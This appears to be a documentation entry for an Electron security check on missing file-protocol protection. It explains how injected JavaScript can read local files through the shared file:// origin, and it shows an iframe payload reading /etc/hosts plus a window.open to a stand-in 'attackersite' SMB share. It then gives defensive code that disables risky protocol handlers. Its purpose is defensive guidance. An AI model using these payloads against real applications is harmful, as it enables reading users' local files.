## FILE_HANDLER_GLOBAL_CHECK - Missing Protection for file Handler

When an Electron application tries to load some content, this is usually achieved through the BrowserWindow's [`loadFile`](https://www.electronjs.org/docs/api/browser-window#winloadfilefilepath-options) API. This function takes a path to an HTML file relative to the root of the application. 
If an attacker is able to run arbitrary Javascript code in the context of the page, because of the same shared `file://` origin, they'll be able to read the content of files from the local file system:

```HTML
<iframe src="file:///etc/hosts" onload="alert(this.contentDocument.body.innerHTML)"> </iframe>
```

Alternatively, if the attacker is able to open new windows, it is still possible to mount a more complex attack, given that Electron does not enforce any notifications or warnings for SMB connection, without user interaction or consent:

```Javascript
window.open("smb://guest:guest@attackersite/public/");
setTimeout(function(){
  window.open("file:///Volumes/public/test.html");
}, 10000);

<!— test.html —>
<iframe src="file:///etc/hosts" onload=“alert(this.contentDocument.body.innerHTML)"> </iframe>
```

To avoid this, Electron introduced the [`protocol.interceptFileProtocol`](https://www.electronjs.org/docs/api/protocol#protocolinterceptfileprotocolscheme-handler) handler. This function should be used for disabling `file://` resources and creating a custom internal local protocol for the resources of the application. Note that for a secure implemention, the application should check the folder in which files are accessed when redefining the protocol handler. This should be done to avoid path traversal or symlink issues.

For a better defence-in-depth, it is also possible to disable other file protocols:

```Javascript
function _disabledHandler(request, callback) {
  return callback();
}

function installWebHandler({ protocol, enableHttp }) {
  protocol.interceptFileProtocol('about', _disabledHandler);
  protocol.interceptFileProtocol('content', _disabledHandler);
  protocol.interceptFileProtocol('chrome', _disabledHandler);
  protocol.interceptFileProtocol('cid', _disabledHandler);
  protocol.interceptFileProtocol('data', _disabledHandler);
  protocol.interceptFileProtocol('filesystem', _disabledHandler);
  protocol.interceptFileProtocol('ftp', _disabledHandler);
  protocol.interceptFileProtocol('gopher', _disabledHandler);
  protocol.interceptFileProtocol('javascript', _disabledHandler);
  protocol.interceptFileProtocol('mailto', _disabledHandler);

  if (!enableHttp) { To turn off browser URI scheme if the app performs all network requests via Node.js
    protocol.interceptFileProtocol('http', _disabledHandler);
    protocol.interceptFileProtocol('https', _disabledHandler);
    protocol.interceptFileProtocol('ws', _disabledHandler);
    protocol.interceptFileProtocol('wss', _disabledHandler);
  }
}

```
